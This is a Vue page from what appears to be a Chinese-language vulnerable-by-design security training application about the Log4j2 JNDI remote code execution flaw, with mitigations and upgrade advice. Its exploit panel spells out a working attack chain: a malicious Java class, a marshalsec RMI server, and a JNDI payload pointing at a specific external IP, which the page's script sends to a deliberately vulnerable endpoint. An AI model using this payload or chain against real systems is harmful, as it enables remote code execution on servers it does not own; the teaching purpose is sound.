<template>
    <div class="root-div">
        <div class="vuln-info">
            <div class="header-div">组件漏洞 -- Log4j2 RCE漏洞</div>
            <div class="body-div">
                <el-tabs v-model="activeName" @tab-click="handleClick">
                    <el-tab-pane label="漏洞描述" name="first">
                        <div class="vuln-detail">
                            Apache Log4j2是一款优秀的Java日志框架。此次漏洞是由 Log4j2
                            提供的lookup功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在处理数据时，并未对输入（如${jndi}）进行严格的判断，从而造成JNDI注入。
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="漏洞危害" name="second">
                        <div class="vuln-detail">
                            Log4j2 漏洞影响范围非常广泛，因为 Log4j2 被大量用于各种 Java
                            应用程序中。攻击者可以利用该漏洞窃取敏感数据、控制服务器，甚至发起拒绝服务攻击。由于其影响范围广、利用门槛低，该漏洞被认为是“核弹级”漏洞。
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="安全编码" name="third">
                        <div class="vuln-detail">
                            方案一、升级版本<br>
                            升级Apache Log4j所有相关应用到最新版本<br><br>
                            方案二、临时缓解（选其一）<br>
                            ● 版本>=2.10.0， 修改jvm参数，添加-Dlog4j2.formatMsgNoLookups=true<br>
                            ● 版本>=2.10.0， 代码中配置System.setProperty("log4j2.formatMsgNoLookups", "true")，重新打包jar包<br>
                            ● 版本>=2.10.0， 修改配置文件log4j2.component.properties ：log4j2.formatMsgNoLookups=True<br><br>
                            注意：临时缓解对Log4j &lt;= 2.9版本是无效的，因为在2.10版本之前并没有引入这些变量来控制 lookup()。 </div>
                    </el-tab-pane>
                    <el-tab-pane label="参考文章" name="fourth">
                        <div class="vuln-detail">
                            <a href="https://www.aliyun.com/noticelist/articleid/1060971232.html" target="_blank"
                                style="text-decoration: underline;">【漏洞通告】Apache Log4j2 远程代码执行漏洞</a><br />
                        </div>
                    </el-tab-pane>
                </el-tabs>
            </div>
        </div>
        <div class="code-demo">
            <!-- gutter 属性用于设置栅格布局中列与列之间的间距；
             span 属性用于指定 <el-col> 元素所占据的栅格数，在 Element UI 中，栅格系统被分为24列（即24栅格），通过指定 span 属性的值，可以控制每个 <el-col> 元素在布局中所占据的栅格数 -->
            <el-row :gutter="20" class="grid-flex">
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">漏洞代码<div>
                                <el-button type="danger" round size="mini"
                                    @click="fetchDataAndFillTable1">去测试</el-button>
                            </div></el-row>
                        <pre v-highlightjs><code class="java">// 漏洞复现步骤
1、构造静态恶意类，并编译成 evil.class 文件
    import java.lang.Runtime;
    import java.lang.Process;
    import java.io.IOException;
    import java.io.FileWriter;

    public class evil {
        public evil (){
            try{
                // Runtime.getRuntime().exec("calc.exe"); // Windows本地源码部署
                // Runtime.getRuntime().exec("open -a Calculator"); // macOS本地源码部署
                String content = "This is a test flag";
                String filePath = "/app/flag.txt";
                
                FileWriter writer = new FileWriter(filePath);
                writer.write(content);
                writer.close();
            }catch (Exception e){
                e.printStackTrace();
            }
        }
        public static void main(String[] argv){
            evil e = new evil();
        }
    }

2、将 evilcalc.class 放到任意http服务器上(如：python3 -m http.server 8088)
3、部署rmi/ldap服务，关联静态恶意类（如：java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://xx.xx.xx.xx:8088/#evil" 9999）
4、发送payload请求到Log4j2漏洞接口：${jndi:rmi://150.109.15.229:9999/evil}，调用成功后，会在/app目录下生成flag.txt文件

注意：需要在项目中配置启用 RMI 协议支持从远程服务器加载 Java 对象：System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

// 后端代码
@RestController
@RequestMapping("/components/log4j2")
public class Log4j2Controller {

    private static final Logger LOGGER = LogManager.getLogger(Log4j2Controller.class);

    @GetMapping("/vuln1")
    public Result Vuln1(String input) {
        LOGGER.info("用户输入: {}", input);
        return Result.success(String.format("用户输入: %s", input));
    }

}
</code></pre>
                    </div>
                </el-col>
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">安全代码 - 恶意字符过滤</el-row>
                        <pre v-highlightjs><code class="java">方案一、升级版本
升级Apache Log4j所有相关应用到最新版本
&lt;dependency&gt;
    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;
    &lt;version&gt;${最新版}&lt;/version&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
    &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
    &lt;version&gt;${最新版}&lt;/version&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
    &lt;artifactId&gt;log4j-slf4j-impl&lt;/artifactId&gt;
    &lt;version&gt;${最新版}&lt;/version&gt;
&lt;/dependency&gt;

方案二、临时缓解（选其一）
● 版本>=2.10.0， 修改jvm参数，添加-Dlog4j2.formatMsgNoLookups=true
● 版本>=2.10.0， 代码中配置System.setProperty("log4j2.formatMsgNoLookups", "true")，重新打包jar包
● 版本>=2.10.0， 修改配置文件log4j2.component.properties ：log4j2.formatMsgNoLookups=True


</code></pre>
                    </div>
                </el-col>
            </el-row>
            <el-row :gutter="20" class="grid-flex">
                <el-col :span="12">
                </el-col>
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">安全代码 - 恶意字符过滤<el-button
                                type="success" round size="mini"
                                @click="fetchDataAndFillTable2">去测试</el-button></el-row>
                        <pre v-highlightjs><code class="java">说明：对恶意字符进行过滤始终不是根本解决方案，建议是升级到最新版本。
// 后端代码
@GetMapping("/sec1")
public Result Sec1(String input) {
    if (!Security.checkSql(input)) {
        LOGGER.warn("检测到非法注入字符");
        return Result.error("检测到非法注入");
    }
    LOGGER.info("用户输入的内容: {}", input);
    return Result.success(String.format("用户输入的内容: %s", input));
}

// 过滤Log4j2日志中的特殊字符
public static boolean checkLog4j2(String content) {
    // 检查是否存在Log4j2日志中的特殊字符
    return !content.matches(".*[&${:}&lt;&gt;\"].*");
}
</code></pre>
                    </div>
                </el-col>
            </el-row>
        </div>
    </div>
</template>

<script>
import axios from 'axios';
import { log4j2Vuln1, log4j2Sec1 } from '@/api/log4j2';

export default {
    data() {
        return {
            activeName: 'first',
            payload1: '${jndi:rmi://150.109.15.229:9999/evil}',
            payload2: '',
        };
    },
    methods: {
        handleClick(tab, event) {
            // console.log(tab, event);
        },
        fetchDataAndFillTable1() {
            log4j2Vuln1({ input: this.payload1 }).then(response => {
                // this.resp_text1.push(response.data);
                console.log(response.data);
            }).catch(error => {
                console.error('Error fetching data:', error);
            });
        },
        fetchDataAndFillTable2() {
            log4j2Sec1({ input: this.payload1 }).then(response => {
                // this.resp_text1.push(response.data);
                console.log(response.data);
            }).catch(error => {
                console.error('Error fetching data:', error);
            });
        },
    }
};
</script>

<style>
.vuln-info {
    /* 设置边框 */
    /* border: 1px solid #ccc; */
    /* 设置边框圆角 */
    border-radius: 10px;
    /* 设置外边距 */
    margin-left: 20px;
    margin-right: 20px;
    margin-bottom: 20px;
    margin-top: 10px;
}

.header-div {
    font-size: 24px;
    color: #409EFF;
    /* 设置字体加粗 */
    font-weight: bold;
    /* 设置内边距 */
    padding: 10px;
    /* 水平居中 */
    justify-content: center;
    /* 垂直居中 */
    align-items: center;
    /* 添加底部边框线条，颜色为灰色 */
    border-bottom: 1px solid #ccc;

}

.body-div {
    /* 设置内边距 */
    padding: 10px;
    justify-content: center;
    /* 水平居中 */
    align-items: center;
    /* 垂直居中 */
    font-family: Arial, sans-serif;
    /* 设置字体为 Arial，并指定备用字体 */
    font-size: 14px;
    /* 设置字体大小为 16像素 */
}

.vuln-detail {
    background-color: #dce9f8;
    padding: 10px;

}

.code-demo {
    /* 设置外边距 */
    margin: 20px;
    border-top: 1px solid #ccc;
    padding-top: 20px;
}

pre code {
    /* 设置字体大小为 14px */
    font-size: 12px;
}

.el-row {
    margin-bottom: 20px;
}

.el-row:last-child {
    margin-bottom: 0;
}

.el-col {
    border-radius: 4px;
}

.bg-purple-dark {
    background: #99a9bf;
}

.bg-purple {
    background: #d3dce6;
}

.bg-purple-light {
    background: #e5e9f2;
}

.grid-content {
    border-radius: 4px;
    /* min-height: 36px; */
    height: 100%;
    padding: 10px;

}

.grid-flex {
    display: flex;
    align-items: stretch;
    /* 让子元素在交叉轴方向（垂直方向）拉伸以匹配高度 */
}

.row-bg {
    padding: 10px 0;
    background-color: #f9fafc;
}

.center-dialog {
    text-align: center;
    margin: 0 auto;
}

.center-dialog-table {
    text-align: center;
}
</style>